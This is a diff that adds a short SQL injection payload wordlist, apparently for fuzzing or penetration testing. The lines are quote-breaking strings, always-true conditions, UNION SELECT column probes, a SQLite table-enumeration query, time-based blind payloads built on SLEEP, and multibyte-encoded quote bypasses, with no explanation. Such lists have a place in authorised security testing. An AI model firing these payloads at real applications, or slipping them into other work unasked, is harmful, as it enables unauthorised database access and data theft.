@@ -1,0 +1,33 @@
+'
+''
+"
+""
+\
+\\
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+'='
+'LIKE'
+'=0--+
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+UNION SELECT NULL;--
+UNION SELECT NULL, NULL;-- 
+UNION SELECT NULL, NULL, NULL;-- 
+AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < 1
+AND CASE WHEN 1=1 THEN 1 ELSE load_extension(1) END
+RLIKE SLEEP(3)
+OR ELT(1=1,SLEEP(3))
+XOR(IF(NOW()=SYSDATE(),SLEEP(3),0))XOR
+AND SLEEP(3)=0
+1 AND (SELECT SLEEP(3) FROM DUAL WHERE DATABASE() LIKE '%')#
+%A8%27 OR 1=1;--
+%8C%A8%27 OR 1=1--
+%bf' OR 1=1 -- --
